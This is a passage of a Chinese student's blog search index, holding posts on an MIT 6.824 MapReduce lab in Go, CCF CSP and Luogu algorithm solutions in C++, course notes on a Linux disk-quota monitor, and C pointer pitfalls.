defer wg.Done() for completedTask &lt; ntasks &#123; var now int=&lt;-Taskchan var tmp=DoTaskArgs&#123;jobName,mapFiles[now],phase,now,n_other&#125; ok:=call(v, &quot;Worker.DoTask&quot;, &amp;tmp, nil) if ok &#123; if !FirstTaskMark&#123; FirstTaskMark=true &#125; completedTask++ &#125;else&#123; //worker出错，将当前执行的任务加入任务队列，同时返回函数（相当于弃置该worker） if now==0 &amp;&amp; FirstTaskMark &#123; &#125;else&#123; Taskchan&lt;-now return &#125; &#125; &#125; if !closeMark &#123; registerChan&lt;-&quot;close&quot; //传递结束信号 close(Taskchan) //关闭管道，防止等待 closeMark=true &#125; &#125;(addr) &#125; wg.Wait() fmt.Printf(&quot;Schedule: %v phase done\\n&quot;, phase)&#125; 回顾自己Part Ⅲ和Part Ⅳ的代码，发现代码非常的冗余，加了太多特判。我在网上查找到另外一种更加简洁的解决方案，在这里也一并贴出 12345678910111213141516171819202122232425262728293031323334353637383940414243func (mr *Master) schedule(phase jobPhase) &#123; var ntasks int var nios int // number of inputs (for reduce) or outputs (for map) switch phase &#123; case mapPhase: ntasks = len(mr.files) nios = mr.nReduce case reducePhase: ntasks = mr.nReduce nios = len(mr.files) &#125; fmt.Printf(&quot;Schedule: %v %v tasks (%d I/Os)\\n&quot;, ntasks, phase, nios) var wg sync.WaitGroup for i := 0; i &lt; ntasks; i++ &#123; wg.Add(1) go func(taskNum int, nios int, phase jobPhase) &#123; defer wg.Done() for &#123; var args DoTaskArgs worker := &lt;-registerChan args.JobName = jobName args.File = files[taskNum] args.Phase = phase args.TaskNumber = taskNum args.NumOtherPhase = nios ok := call(worker, &quot;Worker.DoTask&quot;, &amp;args, new(struct&#123;&#125;)) if ok &#123; go func() &#123; registerChan &lt;- worker &#125;() break &#125; &#125; &#125;(i, n_other, phase) &#125; wg.Wait() fmt.Printf(&quot;Schedule: %v phase done\\n&quot;, phase)&#125; Part V：Inverted index generation 最后一个部分要求我们填写位于main/ii.go中的mapF()和reduceF()函数，完成倒排索引。倒排索引的意思是根据给定的部分内容或关键字，索引得到这一部分内容或关键字的文档出处。我觉得倒排索引最典型的应用就是搜索引擎，根据用户输入的关键词来查找文档以及网页信息。但在这部分实验中我们要完成的内容非常简单。首先mapF函数将输入的文件内容划分为多个word，然后将每一个划分出的word作为key值，输入文件名作为value值创建Key-value pair作为中间值。reduceF函数则需要剔除相同的value值(因为我们只需要知道这个word出现在哪些文件，不需要知道该word在这个文件中具体的出现次数），然后对剩余的value进行计数，同时将value(文件名)保存，最后将所有value保存在一个字符串里返回。 1234567891011121314151617181920212223242526272829func mapF(document string, value string) (res []mapreduce.KeyValue) &#123; words:=strings.FieldsFunc(value,func(r rune) bool&#123;return !unicode.IsLetter(r)&#125;) for _,word:=range(words) &#123; res=append(res,mapreduce.KeyValue&#123;word,document&#125;) &#125; return&#125;func reduceF(key string, values []string) string &#123; //防止重复计数，需要map var check=make(map[string]int) var tmp []string for _,file:=range(values) &#123; _,ok:=check[file] if !ok &#123; check[file]=1 tmp=append(tmp,file) &#125; &#125; sort.Strings(tmp) length:=len(tmp) var res string=strconv.Itoa(length)+&quot; &quot; for i:=0;i&lt;length;i++ &#123; res+=tmp[i] if i!=length-1 &#123; res+=&quot;,&quot; &#125; &#125; return res&#125; 总结 在做lab1之前读了mapreduce的论文，第一次读英文论文花了好长时间(还借助了中文翻译的文档)，但是完成了之后还是很开心的，感觉自己变强了！！！（其实没有），在做lab1的时候花了很多时间卡在了go的一些语法以及标准库函数的使用上，并且在测试程序的时候也在WSL上面踩了坑，在WSL上的diff命令似乎收到编码格式的影响，导致明明结果对了但是diff却认为我的输出和标准输出不一样，最后还是换了虚拟机才跑通…不过最后也算是比较顺利的完成了lab1(指导书里的hint真的非常有用，要认真看！！)，希望在寒假结束之前能够完成lab2吧~","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"CSP-消息传递窗口","slug":"csp-消息传递窗口","date":"2019-12-06T13:47:38.000Z","updated":"2020-08-30T03:59:23.815Z","comments":true,"path":"2019/12/06/csp-消息传递窗口/","link":"","permalink":"http://yoursite.com/2019/12/06/csp-%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92%E7%AA%97%E5%8F%A3/","excerpt":"","text":"【题目描述】老师给了 T 份 MPI 的样例代码，每份代码都实现了 n 个进程通信。这些进程标号 从 0 到 n − 1，每个进程会顺. 序. 执. 行. 自己的收发指令，如:“S x”，“R x”。“S x”表示向 x 号进程发送数据，“R x”表示从 x 号进程接收数据。每一对收发命令必须匹配执行才 能生效，否则会“死锁”。举个例子，x 号进程先执行发送命令“S y”，y 号进程必. 须. 执行接送命令“R x”，这 一对命令才执行成功。否则 x 号进程会一直等待 y 号进程执行对应的接收命令。反之， 若 y 号进程先执行接收命令“R x”，则会一直等待 x 号进程执行发送命令“S y”，若 x 号进程一直未执行发送命令“S y”，则 y 号进程会一直等待 x 号进程执行对应的发送 命令。上述这样发送接收命令不匹配的情况都会造成整个程序出现“死锁”。另外，x 号.进.程.不.会.执.行.“S x”或.“R x”，即.不.会.从.自.己.的.进.程.收.发.消.息.。现在老师请你判断每份样例代码是否会出现“死锁”的情况。每个进程的指令最少 有 1 条，最多有 8 条，这些指令按顺序执行，即第一条执行完毕，才能执行第二条，依 次到最后一条。【输入格式】从标准输入读入数据。输入第一行两个正整数 T, n，表示有 T 份样例代码，实现了 n 个进程通信。 接下来有 T × n 行，每行有若干个(1 − 8 个)字符串，相邻之间有一个空格隔开，表示相应进程的收发指令。不存在非法指令。对于第 2 + i, 0 ≤ i ≤ (T × n − 1) 行，表示 第 i ÷ n(商)份代码的 i ??? n(余数)号进程的收发指令。(比如，“S1”表示向 1 号进程发送消息，“R1”表示从 1 号进程接收消息。细节请 参考样例。)【输出格式】输出到标准输出。输出共 T 行，每行一个数字，表示对应样例代码是否出现“死锁”的情况。1 表示 死锁，0 表示不死锁。第 16 次 CCF CSP 认证【题目背景】 【样例 1 输入】3 2R1 S1S0 R0R1 S1R0 S0R1 R1 R1 R1 S1 S1 S1 S1S0 S0 S0 S0 R0 R0 R0 R0 【样例 1 输出】0 1 0 【样例 1 解释】消息传递接口(mpi)第 1 份代码中，(1)0 号进程执行的“R1”和 1 号进程执行的“S0”成功执行;(2) 0 号进程执行的“S1”和 1 号进程执行的“R0”成功执行，所以未发生“死锁”，程序 顺利运行。第 1 份代码中，(1)0 号进程执行的“R1”和 1 号进程执行的“R0”一直在等待 发送命令，进入“死锁”状态。 【样例 2 输入】2 3R1 S1R2 S0 R0 S2S1 R1R1R2 S0 R0S1 R1 【样例 2 输出】0 1 【样例 2 解释】第 1 份代码中，(1)2 号进程执行的“S1”和 1 号进程执行的“R2”成功执行;(2) 0 号进程执行的“R1”和 1 号进程执行的“S0”成功执行;(3)0 号进程执行的“S1” 和 1 号进程执行的“R0”成功执行;(4)1 号进程执行的“S2”和 2 号进程执行的“R1”成功执行;所以未发生“死锁”，程序顺利运行。第 1 份代码中，(1)2 号进程执行的“S1”和 1 号进程执行的“R2”成功执行;(2)0 号进程执行的“R1”和 1 号进程执行的“S0”成功执行;(3)1 号进程执行的“R0” 和 2 号进程执行的“R1”一直在等待发送命令;进入“死锁”状态。 解题思路最简单的方法就是暴力模拟，对于每一个收发指令都从头到尾遍历一遍数据，但是在数据量大的情况下，这样的匹配效率非常低，但是好在这一题的测试数据比较水，直接采用暴力的方法应该也能够得到大部分分数，进行适度优化也许能直接AC= = 但是我使用的是另一种做法，可以算是对于暴力做法进行了优化，最终时间上也确实加快了很多，先贴上关键代码 123456789101112131415161718192021222324252627282930int match()&#123; &#x2F;&#x2F;使用邻接表的形式存储所有进程的收发指令 int i&#x3D;0; int tmp&#x3D;0; int target&#x3D;0; bool opr; while(i&lt;n)&#123; &#x2F;&#x2F;从上到下开始匹配 if(!length[i])&#123; &#x2F;&#x2F;当该进程的信号已经全部发送完毕时跳过 i++; continue; &#125; tmp&#x3D;l[i].front(); &#x2F;&#x2F;取指令 opr&#x3D;tmp%10; &#x2F;&#x2F;这里解释一下，我对指令信息做了处理 tmp&#x2F;&#x3D;10; &#x2F;&#x2F;我将目标号乘10，最低的各位只存0或1，0表示发信息，1表示收信息，这样做的好处就是可以直接将指令转换为数字存储，并且在下面匹配的时候比较方便。举例R1008,在邻接表中为10081. if(!length[tmp])&#123; &#x2F;&#x2F;查看目标进程，如果目标进程以及没有指令要发 return 1; &#x2F;&#x2F;那么匹配失败，一定会出现死锁 &#125; target&#x3D;l[tmp].front(); if(target&#x3D;&#x3D;i*10+(!opr))&#123; &#x2F;&#x2F;匹配 l[i].pop_front(); length[i]--; l[tmp].pop_front(); &#x2F;&#x2F;如果匹配成功，将两个匹配的信号从队列 length[tmp]--;&#x2F;&#x2F;中弹出，！！！！同时将当前的标记i跳到更小的 i&#x3D;min(i,tmp);&#x2F;&#x2F;地方继续从上到下匹配 &#125; else i++; &#125; for(int i&#x3D;0;i&lt;n;i++)&#123; if(length[i]) return 1; &#125; return 0;&#125; 大体的思路在代码注释中以及解释了，大家也许还有疑惑的就是为什么每一次匹配成功之后，i都要向上跳转，这里就是相对于纯暴力法的优化，对于普通的暴力而言，每一次完成匹配之后都要从第一个进程开始继续寻找一对匹配收发指令，但事实上完全没有必要，下面给出具体解释： 假设目前匹配到第i个进程，假设它的首信号为Rj(不重要)，现在发现第j个进程的首信号为Si，那么他们能够进行匹配，假设i&lt;j，那么在它们匹配结束之后，如果还存在能够匹配的一对收发指令，那么这一对首发指令各自出现的进程号分别有以下几种情况: 1.一个出现在1(i-1)号进程中，一个出现在in号进程中 2.两个都出现在i~n号进程中 即使j&lt;i，上面的情况也是类似的 那么我们可以知道，在i&lt;j的前提下，下一对能匹配的收发指令中至少有一条会出现在i之后的进程中，那么我们从i开始继续往下匹配，就一定不会错过这一对匹配的收发指令。这样就不用从第1号进程开始重新匹配，大大节约了时间。 下面贴出完整的AC代码:328ms,2.632MB 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;list&gt;#include&lt;sstream&gt;#include&lt;cstring&gt;#define MAX 10001using namespace std;int T,n;list&lt;int&gt; l[MAX];int length[MAX]&#x3D;&#123;0&#125;;int match()&#123; int i&#x3D;0; int tmp&#x3D;0; int target&#x3D;0; bool opr; while(i&lt;n)&#123; if(!length[i])&#123; i++; continue; &#125; tmp&#x3D;l[i].front(); opr&#x3D;tmp%10; tmp&#x2F;&#x3D;10; if(!length[tmp])&#123; return 1; &#125; target&#x3D;l[tmp].front(); if(target&#x3D;&#x3D;i*10+(!opr))&#123; l[i].pop_front(); length[i]--; l[tmp].pop_front(); length[tmp]--; i&#x3D;min(i,tmp); &#125; else i++; &#125; for(int i&#x3D;0;i&lt;n;i++)&#123; if(length[i]) return 1; &#125; return 0;&#125;int main() &#123; cin&gt;&gt;T&gt;&gt;n; getchar(); for(int i&#x3D;0;i&lt;T;i++)&#123; for(int j&#x3D;0;j&lt;n;j++)&#123; string keep; getline(cin,keep); stringstream ss(keep); string tmp; while(ss&gt;&gt;tmp) &#123; int a &#x3D; atoi(&amp;(tmp[1])); a *&#x3D; 10; if (tmp[0] &#x3D;&#x3D; &#39;R&#39;) &#x2F;&#x2F;if R 1，else S 0 a++; l[j].push_back(a); length[j]++; &#125; &#125; printf(&quot;%d\\n&quot;,match()); for(int j&#x3D;0;j&lt;n;j++)&#123; l[j].clear(); length[j]&#x3D;0; &#125; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"CSP-2018-3-3 URL映射","slug":"csp-url映射","date":"2019-10-07T06:10:24.000Z","updated":"2020-08-30T03:59:12.987Z","comments":true,"path":"2019/10/07/csp-url映射/","link":"","permalink":"http://yoursite.com/2019/10/07/csp-url%E6%98%A0%E5%B0%84/","excerpt":"","text":"问题描述 URL 映射是诸如 Django、Ruby on Rails 等网页框架 (web frameworks) 的一个重要组件。对于从浏览器发来的 HTTP 请求，URL 映射模块会解析请求中的 URL 地址，并将其分派给相应的处理代码。现在，请你来实现一个简单的 URL 映射功能。 本题中 URL 映射功能的配置由若干条 URL 映射规则组成。当一个请求到达时，URL 映射功能会将请求中的 URL 地址按照配置的先后顺序逐一与这些规则进行匹配。当遇到第一条完全匹配的规则时，匹配成功，得到匹配的规则以及匹配的参数。若不能匹配任何一条规则，则匹配失败。 本题输入的 URL 地址是以斜杠 / 作为分隔符的路径，保证以斜杠开头。其他合法字符还包括大小写英文字母、阿拉伯数字、减号 -、下划线 _ 和小数点 .。例如，/person/123/ 是一个合法的 URL 地址，而 /person/123? 则不合法（存在不合法的字符问号 ?）。另外，英文字母区分大小写，因此 /case/ 和 /CAse/ 是不同的 URL 地址。 对于 URL 映射规则，同样是以斜杠开始。除了可以是正常的 URL 地址外，还可以包含参数，有以下 3 种： 字符串 ：用于匹配一段字符串，注意字符串里不能包含斜杠。例如，abcde0123。 整数 ：用于匹配一个不带符号的整数，全部由阿拉伯数字组成。例如，01234。 路径 ：用于匹配一段字符串，字符串可以包含斜杠。例如，abcd/0123/。 以上 3 种参数都必须匹配非空的字符串。简便起见，题目规定规则中 和 前面一定是斜杠，后面要么是斜杠，要么是规则的结束（也就是该参数是规则的最后一部分）。而 的前面一定是斜杠，后面一定是规则的结束。无论是 URL 地址还是规则，都不会出现连续的斜杠。 输入格式 输入第一行是两个正整数 n 和 m_，分别表示 URL 映射的规则条数和待处理的 URL 地址个数，中间用一个空格字符分隔。 第 2 行至第 _n+1 行按匹配的先后顺序描述 URL 映射规则的配置信息。第 i+1 行包含两个字符串 pi 和 ri_，其中 _pi 表示 URL 匹配的规则，ri 表示这条 URL 匹配的名字。两个字符串都非空，且不包含空格字符，两者中间用一个空格字符分隔。 第 n+2 行至第 n+m+1 行描述待处理的 URL 地址。第 n+1+i 行包含一个字符串 _qi_，表示待处理的 URL 地址，字符串中不包含空格字符。 输出格式输入共 m 行，第 i 行表示 qi 的匹配结果。如果匹配成功，设匹配了规则 pj ，则输出对应的 _rj_。同时，如果规则中有参数，则在同一行内依次输出匹配后的参数。注意整数参数输出时要把前导零去掉。相邻两项之间用一个空格字符分隔。如果匹配失败，则输出 404。样 输入格式5 4/articles/2003/ special_case_2003/articles// year_archive/articles/// month_archive/articles//// article_detail/static/ static_serve/articles/2004//articles/1985/09/aloha//articles/hello//static/js/jquery.js 样例输出year_archive 2004article_detail 1985 9 aloha404static_serve js/jquery.js 数据规模1 ≤ n ≤ 100，1 ≤ m ≤ 100。 所有输入行的长度不超过 100 个字符（不包含换行符）。 保证输入的规则都是合法的。 一道标准的暴力字符匹配题，但是由于CSP进行的是OI赛制，无法实时的了解自己的分数，这类的模拟题要拿到满分还是有一定的难度。 一开始我的做法是第一遍进行匹配，然后将每一条URL地址的参数放入数组oprend进行存储，等到这一条URL地址确定找到匹配的规则的时候，再将oprend数组中的参数全部输出，同时要对oprend数组进行清空供下一条URL地址存放参数。 但提交后只得到50分，提交了几次也找不到问题到底出在哪里（我被洛谷直接给样例的行为惯坏了……） 然后我去网上找了一找题解，突然发现了一种码量骤减并且相对我原先方法更加巧妙的解法。大致思路是: 1.使用匹配函数match(j,i,false)，表示将第j条规则与第i条地址进行匹配，而第三个bool参数表示，当该参数为false时，我们只进行匹配，与上一种方法不同的是匹配过程中，不需要存储参数，我们只需要知道地址和规则是否匹配就可以了。 2.在上一次match返回true表示匹配成功的时候，先输出匹配成功的规则代名词，然后再次调用match(j,i,true)，这一次我们已经知道第j条规则和第i条地址是能够成功匹配的，那么在匹配过程中遇到地址中的参数时，我们就将其输出。 改进后代码简洁了许多，我们不需要在匹配的时候多开一个参数数组来存储参数，也不需要在每一次匹配结束后清空参数数组，但是显而易见的是，每一次匹配成功的时候都要多进行一次match，大致的时间复杂度为O(nm+m)，这一次代码提交后得到了100分(但我觉得就正确性而言两种方法其实差不多…)。 附上AC代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;iostream&gt;#define MAX 110using namespace std;int n, m;char branch;string keep[MAX];string shName[MAX];string mate[MAX];bool match(int a, int b, bool flag) &#123; int i &#x3D; 0, j &#x3D; 0; int length_a &#x3D; keep[a].size(); int length_b &#x3D; mate[b].size(); while (i &lt; length_a &amp;&amp; j &lt; length_b) &#123; if (keep[a][i] &#x3D;&#x3D; &#39;&lt;&#39;) &#123; &#x2F;&#x2F;当遇到参数时进入 i++; branch &#x3D; keep[a][i]; while (keep[a][i] !&#x3D; &#39;&gt;&#39;) &#123; &#x2F;&#x2F;直接跳出&lt;&gt; i++; &#125; i++; if(flag) cout &lt;&lt; &quot; &quot;; if (branch &#x3D;&#x3D; &#39;i&#39;) &#123; &#x2F;&#x2F;参数为&lt;int&gt; bool targ &#x3D; false; while (mate[b][j] !&#x3D; &#39;&#x2F;&#39; &amp;&amp; j &lt; length_b) &#123; if (mate[b][j]&lt;&#39;0&#39; || mate[b][j]&gt;&#39;9&#39;) &#123; return false; &#125; if (mate[b][j] !&#x3D; &#39;0&#39;) &#123; &#x2F;&#x2F;去除前置0 targ &#x3D; true; &#125; if (targ &amp;&amp; flag) &#123; &#x2F;&#x2F;输出数字 printf(&quot;%c&quot;, mate[b][j]); &#125; j++; &#125; &#125; else if (branch &#x3D;&#x3D; &#39;s&#39;) &#123; &#x2F;&#x2F;当参数为&lt;str&gt;时 while (mate[b][j] !&#x3D; &#39;&#x2F;&#39; &amp;&amp; j &lt; length_b) &#123; if ((mate[b][j] &gt;&#x3D; &#39;A&#39; &amp;&amp; mate[b][j] &lt;&#x3D; &#39;Z&#39;) || (mate[b][j] &gt;&#x3D; &#39;a&#39; &amp;&amp; mate[b][j] &lt;&#x3D; &#39;z&#39;) || mate[b][j] &#x3D;&#x3D; &#39;-&#39; || mate[b][j] &#x3D;&#x3D; &#39;.&#39; || mate[b][j] &#x3D;&#x3D; &#39;_&#39; || (mate[b][j] &gt;&#x3D; &#39;0&#39; &amp;&amp; mate[b][j] &lt;&#x3D; &#39;9&#39;)) &#123; if (flag) &#123; printf(&quot;%c&quot;, mate[b][j]); &#125; &#125; else &#123; return false; &#125; j++; &#125; &#125; else if (branch &#x3D;&#x3D; &#39;p&#39;) &#123; &#x2F;&#x2F;当参数为&lt;path&gt;时 while (j &lt; length_b) &#123; if (mate[b][j] &#x3D;&#x3D; &#39;&#x2F;&#39; || (mate[b][j] &gt;&#x3D; &#39;A&#39; &amp;&amp; mate[b][j] &lt;&#x3D; &#39;Z&#39;) || (mate[b][j] &gt;&#x3D; &#39;a&#39; &amp;&amp; mate[b][j] &lt;&#x3D; &#39;z&#39;) || mate[b][j] &#x3D;&#x3D; &#39;-&#39; || mate[b][j] &#x3D;&#x3D; &#39;.&#39; || mate[b][j] &#x3D;&#x3D; &#39;_&#39; || (mate[b][j] &gt;&#x3D; &#39;0&#39; &amp;&amp; mate[b][j] &lt;&#x3D; &#39;9&#39;)) &#123; if (flag) &#123; printf(&quot;%c&quot;, mate[b][j]); &#125; &#125; else &#123; return false; &#125; j++; &#125; return true; &#125; &#125; else &#123; if (keep[a][i] !&#x3D; mate[b][j]) &#123; return false; &#125; else &#123; i++; j++; &#125; &#125; &#125; return (i &#x3D;&#x3D; length_a &amp;&amp; j &#x3D;&#x3D; length_b); &#x2F;&#x2F;地址和规则的匹配必须同时结束才算成功&#125;bool isValid(char a) &#123; return (a &#x3D;&#x3D; &#39;&#x2F;&#39; || (a &gt;&#x3D; &#39;A&#39; &amp;&amp; a &lt;&#x3D; &#39;Z&#39;) || (a &gt;&#x3D; &#39;a&#39; &amp;&amp; a &lt;&#x3D; &#39;z&#39;) || a &#x3D;&#x3D; &#39;-&#39; || a &#x3D;&#x3D; &#39;.&#39; || a &#x3D;&#x3D; &#39;_&#39; || (a &gt;&#x3D; &#39;0&#39; &amp;&amp; a &lt;&#x3D; &#39;9&#39;));&#125;int main() &#123; cin &gt;&gt; n &gt;&gt; m; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; cin &gt;&gt; keep[i]; cin &gt;&gt; shName[i]; &#125; for (int i &#x3D; 1; i &lt;&#x3D; m; i++) &#123; cin &gt;&gt; mate[i]; &#x2F;&#x2F; judge the vality bool mark &#x3D; true; int length &#x3D; mate[i].size(); for (int j &#x3D; 0; j &lt; length; j++) &#123; if (!isValid(mate[i][j])) &#123; mark &#x3D; false; break; &#125; &#125; if (!mark) &#123; cout &lt;&lt; &quot;404\\n&quot;; continue; &#125; bool a &#x3D; false; for (int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123; if (match(j, i, false)) &#123; &#x2F;&#x2F;确定匹配是否成功 a &#x3D; true; cout &lt;&lt; shName[j]; match(j, i, true); &#x2F;&#x2F;输出参数 printf(&quot;\\n&quot;); break; &#125; &#125; if (!a) &#123; 当匹配全部失败的时候输出404 cout &lt;&lt; &quot;404\\n&quot;; &#125; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"P5520 [yLOI2019] 青原樱","slug":"p5520-yloi2019-青原樱","date":"2019-10-05T15:06:24.000Z","updated":"2020-08-30T04:01:08.322Z","comments":true,"path":"2019/10/05/p5520-yloi2019-青原樱/","link":"","permalink":"http://yoursite.com/2019/10/05/p5520-yloi2019-%E9%9D%92%E5%8E%9F%E6%A8%B1/","excerpt":"","text":"https://www.luogu.org/problem/P5520?contestId=20125 方法一:动态规划 这题一开始的想法是用dp来求出可种植的所有方案，然后排列组合m支幼苗 设dp[i][j]表示已经放了i个幼苗其中第i个幼苗放在第j个位置的方案数，状态转移方程为: 但是在编写过程中要讲dp[1][j]以及dp[0][0]先处理好，否则上述公式会出现错误。 可以看出dp过程中共有n*m个状态，每个状态转移的复杂度都是O(n)，总复杂度为O(n²m)，这个复杂度在后面两个大数据的测试点中会TLE，并且dp的二维数组过大也会OLE，所以使用dp方案只能获得混一点分。 方法二:组合数学 在dp失败后我们可以考虑使用组合数学的方法。 在这里我们首先要分类讨论： 一.最后一个位子不放幼苗的情况。 二.最后一个位子放幼苗的情况 首先讨论最后一个位子不放幼苗的情况，由于任意两个幼苗之间不能相邻，我们可以假设每一个幼苗后有一个空格作为它的”挂件”，这样我们就可以不用考虑幼苗的相邻问题直接进行排列。即在(n-m)个格子中放入m个幼苗，则方案数共有: 然后讨论最后一个位子放置幼苗的情况，除了最后一个位置固定放置幼苗外，其他条件与前一种情况相似，则可供放置的格子有(n-1)-(m-1)=n-m，需要放置的幼苗有(m-1)个，但最终的排列还是m种，则方案数有: 由代数恒等式: 得到最终方案数: 该方案的时间复杂度仅为O(n)。 AC代码 12345678910111213#include &lt;cstdio&gt;#include&lt;iostream&gt;using namespace std;int main() &#123; int type, n, m, p; cin &gt;&gt; type &gt;&gt; n &gt;&gt; m &gt;&gt; p; long long ans &#x3D; 1; for (int i &#x3D; n-2*m+2; i &lt;&#x3D; n-m+1; i++) &#123; ans &#x3D; (ans * i) % p; &#125; printf(&quot;%lld\\n&quot;, ans); return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"综设Ⅰ-Linux系统下的文件系统限量监控程序","slug":"综设Ⅰ-linux系统下的文件系统限量监控程序","date":"2019-10-04T13:50:33.000Z","updated":"2020-08-30T04:03:15.478Z","comments":true,"path":"2019/10/04/综设Ⅰ-linux系统下的文件系统限量监控程序/","link":"","permalink":"http://yoursite.com/2019/10/04/%E7%BB%BC%E8%AE%BE%E2%85%A0-linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%99%90%E9%87%8F%E7%9B%91%E6%8E%A7%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"前置学习资料与要求 使用VMware安装一个虚拟机(建议安装Ubuntu，直接到官网下载最新的版本) https://www.linuxprobe.com/chapter-02.html (简单学习linux系统的基本命令，大概了解他们的作用，再需要使用的时候再翻看文档） https://www.linuxprobe.com/chapter-04.html (学会使用vim编辑器，尽量也学习一下Shell脚本的编写方法） https://www.linuxprobe.com/chapter-05.html (主要看5.2文件权限和归属) 实验内容与要求 在UNIX操作系统下用C语言或shell语言编写一个对用户使用文件系统（磁盘）空间的限量监控程序。通过菜单设置可选择指定用户在指定的文件系统下的存储空间和文件数量的使用限量。当程序监控到指定用户的使用量超限时，就向该用户提示警告信息，当用户的使用量降低时，停止警告提示并恢复正常。 实现方法 在网上找到类似的linux磁盘监视和警告脚本大多都是用shell语言来实现的，我想如果找不到用C来解决的方法的话，可能大家需要花一些时间去看一看shell脚本的语法(不用担心，大多与C相似，中间穿插一些linux系统的命令) 1. https://yq.aliyun.com/articles/39223（linux监控磁盘空间和使用情况,需要了解一下df命令，下面给出学习链接) 2.我想到一个方法，可以通过使用inode(文件索引节点，下方给出介绍链接)来完成任务。 首先编写脚本，当该磁盘下有新的文件创建时，查看该文件的inode节点，inode节点会记录它对应文件的大小和所有者，当我们发现该文件为limited user的文件时，就将该文件的大小记录下来，并专门开一个变量num和memory分别记录limited user在该磁盘下使用的存储空间和文件数量。当计算到超标的时候就打印警告，当使用量降低的时候就停止警告。 这个方法也许还是要使用shell脚本来实现，因为我现在不太明白C语言怎么去导入和处理操作系统的信息(也许有同学知道的可以反馈给大家) 其他资料 https://www.runoob.com/linux/linux-filesystem.html (linux中磁盘操作命令，df,du,fdisk） https://blog.csdn.net/xuz0917/article/details/79473562 (innode文件索引节点的介绍)","categories":[{"name":"其它","slug":"其它","permalink":"http://yoursite.com/categories/%E5%85%B6%E5%AE%83/"}],"tags":[]},{"title":"C语言数组与指针注意点","slug":"c语言数组与指针注意点","date":"2019-03-01T15:41:07.000Z","updated":"2020-08-30T04:01:23.884Z","comments":true,"path":"2019/03/01/c语言数组与指针注意点/","link":"","permalink":"http://yoursite.com/2019/03/01/c%E8%AF%AD%E8%A8%80%E6%95%B0%E7%BB%84%E4%B8%8E%E6%8C%87%E9%92%88%E6%B3%A8%E6%84%8F%E7%82%B9/","excerpt":"","text":"今天写了一个判断两集合包含关系的程序。因为好久没写C导致我花了很多时间在C语言的数组和指针的使用上。在完成这个C程序后，决定把今天走过的坑都填一填，总结一下： ·指针数组1.对指针数组输入数据的时候，应该先为这个指针数组开辟新的内存，将其指向新内存，再使用gets()直接读入。 2.不能通过同一个中间变量tmp来给指针数组输送值，否则会导致指针数组中的全部指针都指向tmp，最后使整个数组的内容都相同。（我也不知道为什么我要用个tmp来传值……) 3.要访问指针数组中每一个元素a[k]时，不需要*a[k],直接使用a[k]就可以读取对应内存中的数据，但对于一般的指针p，要读取他的内容则须*p。 ·数组指针和指针数组的区别数组指针是 （*)a[n]，而指针数组是 *a[n],数组指针首先是一个指针，他指向a数组中的连续n个元素。指针数组是一个数组，数组中每一个元素都是指向其他地址的指针。 ·（插播一条)关于scanf的问题写程序中常常遇到scanf被跳过的问题，经过调试后发现，每一次被跳过的都是程序中的第二个scanf，原因是执行第一条scanf语句时，我们在输出数值的时候最后多打了一个’\\n’，而这个’\\n’会作为第二句scanf的输入，系统认为这个’\\n’就是你要输入的值。 为了解决这个方法，我们可以在第二个scanf前加一个getchar(),使用getchar()来接受多余的’\\n’，或者使用gets().","categories":[{"name":"其它","slug":"其它","permalink":"http://yoursite.com/categories/%E5%85%B6%E5%AE%83/"}],"tags":[]}],"categories":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/categories/csapp/"},{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"},{"name":"cmu15-445","slug":"cmu15-445","permalink":"http://yoursite.com/categories/cmu15-445/"},{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"},{"name":"其它","slug":"其它","permalink":"http://yoursite.com/categories/%E5%85%B6%E5%AE%83/"}],"tags":[]}